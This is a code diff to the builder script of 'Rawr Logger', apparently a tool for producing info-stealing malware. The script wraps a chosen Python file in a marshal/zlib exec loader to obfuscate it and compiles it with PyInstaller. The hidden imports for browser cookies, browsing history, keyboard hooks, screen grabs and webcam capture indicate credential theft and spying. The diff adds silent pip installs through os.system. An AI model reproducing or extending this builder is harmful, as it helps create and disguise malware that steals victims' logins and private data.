@@ -1,10 +1,19 @@
 import marshal
 import zlib
-import requests
-from pystyle import *
 import os
 import time
-import shutil
+try:
+    import requests
+    from pystyle import *
+    os.system('pip install pyinstaller')
+except:
+    print("Installing Requirements For You")
+    os.system('pip install requests')
+    os.system('pip install pyinstaller')
+    os.system('pip install pystyle')
+    print("Please Rerun The Program")
+    time.sleep(1)
+
 os.system(f'cls & title Rawr Logger Builder!')
 Write.Print(Center.XCenter("""
     ____                         __                               
@@ -38,9 +47,9 @@ with open(f'{name}.py') as fi:
         f.write(f"import marshal,zlib;exec(marshal.loads(zlib.decompress({zlb})))")
     compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
     if compile == "y":
-        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="platform" --hidden-import="json" --hidden-import="browser_cookie3" --hidden-import="cv2" --hidden-import="re" --hidden-import="uuid" --hidden-import="keyboard" --hidden-import="Chrome" --hidden-import="ctypes" --hidden-import="psutil" --hidden-import="sys" --hidden-import="pynput" --hidden-import="uuid" --hidden-import="PIL" --hidden-import="PIL.ImageGrab" --hidden-import="browser_history" --hidden-import="win32api" {name}.py')
+        os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="os" --hidden-import="socket" --hidden-import="threading" --hidden-import="platform" --hidden-import="json" --hidden-import="browser_cookie3" --hidden-import="cv2" --hidden-import="re" --hidden-import="uuid" --hidden-import="keyboard" --hidden-import="Chrome" --hidden-import="psutil" --hidden-import="sys" --hidden-import="pynput" --hidden-import="uuid" --hidden-import="PIL" --hidden-import="PIL.ImageGrab" --hidden-import="browser_history" --hidden-import="win32api" {name}.py')
         os.remove(f'{name}.spec')
-        Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
+        Write.Print(f"{name} Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
         time.sleep(2)
         Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
         time.sleep(3)
